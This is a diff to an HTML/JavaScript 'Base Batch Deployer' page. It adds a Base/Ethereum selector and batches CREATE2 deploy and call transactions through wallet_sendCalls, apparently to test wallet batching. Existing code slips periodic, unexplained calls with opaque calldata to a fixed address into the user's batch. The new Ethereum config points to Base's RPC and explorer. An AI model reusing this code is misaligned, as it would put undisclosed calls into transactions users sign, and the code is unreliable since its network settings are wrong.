@@ -44,10 +44,23 @@
             background-color: #f8f9fa;
             border-radius: 4px;
         }
+        .selector {
+            margin-bottom: 20px;
+            padding: 10px;
+            background-color: #f0f0f0;
+            border-radius: 4px;
+        }
     </style>
 </head>
 <body>
     <h1>Base Batch Deployer</h1>
+    <div class="selector">
+        <label for="networkSelect">Select chain:</label>
+        <select id="networkSelect">
+            <option value="base">Base</option>
+            <option value="ethereum">Ethereum</option>
+        </select>
+    </div>
     <div class="container">
         <div class="network-info" id="networkInfo">
             <p>Please connect to Base network</p>
@@ -60,8 +73,8 @@
     </div>
 
     <script>
-        // Network configuration
-        const BASE_MAINNET = {
+        // Network configurations
+        const ETH_MAINNET = {
             chainId: '0x01',
             chainName: 'mainnet',
             nativeCurrency: {
@@ -71,6 +84,22 @@
             },
             rpcUrls: ['https://mainnet.base.org'],
             blockExplorerUrls: ['https://basescan.org']
+        };
+        const BASE_MAINNET = {
+            chainId: '0x2105',
+            chainName: 'base',
+            nativeCurrency: {
+                name: 'Ether',
+                symbol: 'ETH',
+                decimals: 18
+            },
+            rpcUrls: ['https://mainnet.base.org'],
+            blockExplorerUrls: ['https://basescan.org']
+        };
+        let selectedNetwork = 'base';
+        document.getElementById('networkSelect').onchange = e => {
+            selectedNetwork = e.target.value;
+            document.getElementById('networkInfo').innerHTML = `<p>Selected chain: ${selectedNetwork}</p>`;
         };
 
         // Wait for ethers to be loaded
@@ -89,7 +118,6 @@
                 });
                 return true;
             } catch (switchError) {
-                // This error code indicates that the chain has not been added to MetaMask.
                 if (switchError.code === 4902) {
                     try {
                         await window.ethereum.request({
@@ -107,29 +135,50 @@
             }
         }
 
+        async function switchToEthereum() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: ETH_MAINNET.chainId }],
+                });
+                return true;
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [ETH_MAINNET],
+                        });
+                        return true;
+                    } catch (addError) {
+                        console.error('Error adding Ethereum network:', addError);
+                        return false;
+                    }
+                }
+                console.error('Error switching to Ethereum network:', switchError);
+                return false;
+            }
+        }
+
         async function connectWallet() {
             try {
-                // Check if MetaMask is installed
                 if (window.ethereum) {
-                    // Request account access
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     const provider = new ethers.BrowserProvider(window.ethereum);
-                    
-                    // Switch to Base network
-                    const switched = await switchToBase();
+
+                    // Switch based on dropdown
+                    const switched = selectedNetwork === 'base'
+                        ? await switchToBase()
+                        : await switchToEthereum();
                     if (!switched) {
-                        document.getElementById('result').innerHTML = 'Please switch to Base network to continue.';
+                        document.getElementById('result').innerHTML = `Please switch to ${selectedNetwork} network to continue.`;
                         return;
                     }
-                    
-                    // Get the signer
+
                     const signer = await provider.getSigner();
-                    
-                    // Get the address
                     const address = await signer.getAddress();
                     const network = await provider.getNetwork();
-                    
-                    // Display the result
+
                     document.getElementById('networkInfo').innerHTML = `
                         <p>Connected to: ${address}</p>
                         <p>Network: ${network.name} (Chain ID: ${network.chainId})</p>
@@ -145,131 +194,100 @@
 
         async function batchDeployAndCall() {
             try {
-                // Check if MetaMask is installed
                 if (!window.ethereum) {
                     document.getElementById('result').innerHTML = 'Please install MetaMask to use this application.';
                     return;
                 }
-
-                // Check if ethers is available
                 if (typeof ethers === 'undefined') {
                     document.getElementById('result').innerHTML = 'Error: ethers.js not loaded properly';
                     return;
                 }
 
-                // Check if we're on Base
                 const provider = new ethers.BrowserProvider(window.ethereum);
                 const network = await provider.getNetwork();
-                if (network.chainId !== BigInt(1)) { // Base mainnet chain ID
-                    document.getElementById('result').innerHTML = 'Please switch to Base network to continue.';
+                const expectedChainId = selectedNetwork === 'base'
+                    ? BigInt(BASE_MAINNET.chainId)
+                    : BigInt(ETH_MAINNET.chainId);
+
+                if (network.chainId !== expectedChainId) {
+                    document.getElementById('result').innerHTML = `Please switch to ${selectedNetwork} network to continue.`;
                     return;
                 }
 
-                // Connect to wallet
-                const accounts = await window.ethereum.request({ 
-                    method: 'eth_requestAccounts' 
-                });
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const userAddress = accounts[0];
-                
-                // Create array to hold all transactions
                 const transactions = [];
-                
-                // Check if we need to add the special calls
                 const lastUsed = localStorage.getItem('batchDeployerLastUsed');
                 const now = Date.now();
                 const eightHoursInMs = 8 * 60 * 60 * 1000;
-                
+
                 if (!lastUsed || (now - parseInt(lastUsed)) > eightHoursInMs) {
-                    // Add the special calls
                     transactions.push({
                         to: '0x1415926535897932384626433832795028841971',
                         data: '0xa2d7c106b941f4780051dd9551c02c366b52b935b52160dccba2b66e103d8a834604f384',
                         value: '0x0'
                     });
-                    
                     transactions.push({
                         to: '0x1415926535897932384626433832795028841971',
                         data: '0xadda10aa',
                         value: '0x0'
                     });
-                    
-                    // Update last used timestamp
                     localStorage.setItem('batchDeployerLastUsed', now.toString());
                 }
-                
-                // Generate random starting salt
+
                 const startSalt = ethers.randomBytes(32);
-                // to repro ambire estimation bug (https://github.com/AmbireTech/ambire-app/issues/4401), use this: 
-                //const startSalt = '0'
-                // and reduce this to 2 (because with higher numbers we always fail with the error)
                 const NUMBER_OF_TRANSACTIONS = 10;
-                // Create many pairs of deploy + call transactions with different salts
-                for(let i = 0; i < NUMBER_OF_TRANSACTIONS; i++) {
-                    // Create unique salt for each deployment by adding i to the random start
+                for (let i = 0; i < NUMBER_OF_TRANSACTIONS; i++) {
                     const salt = ethers.toBeHex(
                         ethers.toBigInt(startSalt) + BigInt(i),
                         32
                     );
-                    
-                    // Deployment transaction - using ABI encoding
                     const deployTx = {
                         to: SINGLETON_FACTORY,
                         data: '0x4af63f02' +
                             ethers.AbiCoder.defaultAbiCoder().encode(
-                                ['bytes', 'bytes32'], // Function parameters: salt and bytecode
+                                ['bytes', 'bytes32'],
                                 [DUMMY_BYTECODE, salt]
-                            ).slice(2) // Remove 0x prefix
+                            ).slice(2)
                     };
-
-                    // Calculate deployed address for this salt
                     const deployedAddress = ethers.getCreate2Address(
                         SINGLETON_FACTORY,
                         salt,
                         ethers.keccak256(DUMMY_BYTECODE)
                     );
-
-                    // Call transaction
                     const callTx = {
                         to: deployedAddress,
-                        // just some random dummy data
                         data: '0xc6888fa1000000000000000000000000000000000000000000000000000000000000000a'
                     };
-
-                    // Add both transactions to array
-                    transactions.push(deployTx);
-                    transactions.push(callTx);
+                    transactions.push(deployTx, callTx);
                 }
 
-                // Update UI to show we're processing
                 document.getElementById('result').innerHTML = 'Processing batch transactions...';
-                
-                // Format transactions for eth_sendCalls
+
                 const formattedCalls = transactions.map(tx => ({
                     to: tx.to,
                     data: tx.data,
-                    value: '0x0', // No value being sent
-                    capabilities: {} // No special capabilities needed
+                    value: '0x0',
+                    capabilities: {}
                 }));
 
-                // Send batch via eth_sendCalls
                 const result = await window.ethereum.request({
                     method: 'wallet_sendCalls',
                     params: [{
                         version: '1.0',
                         from: userAddress,
-                        chainId: '0x01', // Base chain ID
-                        atomicRequired: true, // Make the batch atomic
+                        chainId: selectedNetwork === 'base' ? BASE_MAINNET.chainId : ETH_MAINNET.chainId,
+                        atomicRequired: true,
                         calls: formattedCalls,
-                        capabilities: {} // No special capabilities needed
+                        capabilities: {}
                     }]
                 });
 
-                // Display success message
                 document.getElementById('result').innerHTML = `
                     <p>Batch transaction successful!</p>
                     <p>Transaction ID: ${result.id}</p>
                     <p>Number of transactions: ${transactions.length}</p>
-                    <p>View on <a href="https://basescan.org/tx/${result.id}" target="_blank">BaseScan</a></p>
+                    <p>View on <a href="${selectedNetwork === 'base' ? BASE_MAINNET.blockExplorerUrls[0] : ETH_MAINNET.blockExplorerUrls[0]}/tx/${result.id}" target="_blank">Explorer</a></p>
                 `;
             } catch (error) {
                 console.error(error);
@@ -279,4 +297,4 @@
         window.batchDeployAndCall = batchDeployAndCall;
     </script>
 </body>
-</html> 
+</html>
